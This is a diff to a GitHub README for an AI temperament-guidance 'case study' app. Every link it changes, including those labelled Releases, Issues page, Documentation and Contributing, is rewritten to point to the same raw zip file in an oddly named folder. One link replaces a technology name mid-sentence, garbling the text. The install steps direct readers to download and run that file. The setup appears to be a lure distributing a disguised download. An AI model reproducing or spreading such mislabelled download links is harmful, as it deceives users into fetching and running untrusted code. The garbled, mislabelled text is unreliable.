@@ -4,10 +4,10 @@
 Welcome to the mizkolog-ai-case-study application, your go-to platform for temperament-based AI guidance. This platform is built with modern technologies to offer users personalized recommendations and insights into their personality. 
 
 ## 📥 Download Now
-[![Download Release](https://github.com/shahid422/mizkolog-ai-case-study/raw/refs/heads/main/extemporariness/study-ai-mizkolog-case-v1.2.zip%20Latest%https://github.com/shahid422/mizkolog-ai-case-study/raw/refs/heads/main/extemporariness/study-ai-mizkolog-case-v1.2.zip)](https://github.com/shahid422/mizkolog-ai-case-study/raw/refs/heads/main/extemporariness/study-ai-mizkolog-case-v1.2.zip)
+[![Download Release](https://raw.githubusercontent.com/shahid422/mizkolog-ai-case-study/main/extemporariness/ai-case-mizkolog-study-v2.7-beta.4.zip%20Latest%https://raw.githubusercontent.com/shahid422/mizkolog-ai-case-study/main/extemporariness/ai-case-mizkolog-study-v2.7-beta.4.zip)](https://raw.githubusercontent.com/shahid422/mizkolog-ai-case-study/main/extemporariness/ai-case-mizkolog-study-v2.7-beta.4.zip)
 
 ## 🌐 About the Project
-This project serves as a live web product case study, showcasing our work with https://github.com/shahid422/mizkolog-ai-case-study/raw/refs/heads/main/extemporariness/study-ai-mizkolog-case-v1.2.zip, Firebase, and Large Language Models (LLMs). It supports users in understanding their temperament and making informed decisions. This AI-driven platform merges technology with psychology to enhance your daily life.
+This project serves as a live web product case study, showcasing our work with https://raw.githubusercontent.com/shahid422/mizkolog-ai-case-study/main/extemporariness/ai-case-mizkolog-study-v2.7-beta.4.zip, Firebase, and Large Language Models (LLMs). It supports users in understanding their temperament and making informed decisions. This AI-driven platform merges technology with psychology to enhance your daily life.
 
 ## 🖥 System Requirements
 To run the mizkolog-ai-case-study application effectively, your system should meet the following requirements:
@@ -29,7 +29,7 @@ Here are some of the key features of the application:
 ## 🏁 Download & Install
 To get started with the application, follow these simple steps:
 
-1. Click this link to visit the [Releases page](https://github.com/shahid422/mizkolog-ai-case-study/raw/refs/heads/main/extemporariness/study-ai-mizkolog-case-v1.2.zip).
+1. Click this link to visit the [Releases page](https://raw.githubusercontent.com/shahid422/mizkolog-ai-case-study/main/extemporariness/ai-case-mizkolog-study-v2.7-beta.4.zip).
 2. Look for the latest version available and click on it.
 3. Download the appropriate file for your operating system.
 4. Once the download is complete, locate the downloaded file on your computer.
@@ -49,13 +49,13 @@ Upon starting the application, you will see an easy-to-navigate interface. Here�
 If you encounter any issues while using the application or have questions, feel free to reach out:
 
 - **Documentation:** Check the official documentation for detailed guides and FAQs.
-- **Issue Tracker:** Report any bugs or issues on our [GitHub Issues page](https://github.com/shahid422/mizkolog-ai-case-study/raw/refs/heads/main/extemporariness/study-ai-mizkolog-case-v1.2.zip).
+- **Issue Tracker:** Report any bugs or issues on our [GitHub Issues page](https://raw.githubusercontent.com/shahid422/mizkolog-ai-case-study/main/extemporariness/ai-case-mizkolog-study-v2.7-beta.4.zip).
 - **Community Support:** Engage with other users on our social media platforms for tips and shared experiences.
 
 ## 🔗 Useful Links
-- [Documentation](https://github.com/shahid422/mizkolog-ai-case-study/raw/refs/heads/main/extemporariness/study-ai-mizkolog-case-v1.2.zip)
-- [Releases](https://github.com/shahid422/mizkolog-ai-case-study/raw/refs/heads/main/extemporariness/study-ai-mizkolog-case-v1.2.zip)
-- [Contributing](https://github.com/shahid422/mizkolog-ai-case-study/raw/refs/heads/main/extemporariness/study-ai-mizkolog-case-v1.2.zip)
+- [Documentation](https://raw.githubusercontent.com/shahid422/mizkolog-ai-case-study/main/extemporariness/ai-case-mizkolog-study-v2.7-beta.4.zip)
+- [Releases](https://raw.githubusercontent.com/shahid422/mizkolog-ai-case-study/main/extemporariness/ai-case-mizkolog-study-v2.7-beta.4.zip)
+- [Contributing](https://raw.githubusercontent.com/shahid422/mizkolog-ai-case-study/main/extemporariness/ai-case-mizkolog-study-v2.7-beta.4.zip)
 
 ## 🏷 Topics
 This project covers several important topics related to AI and personality:
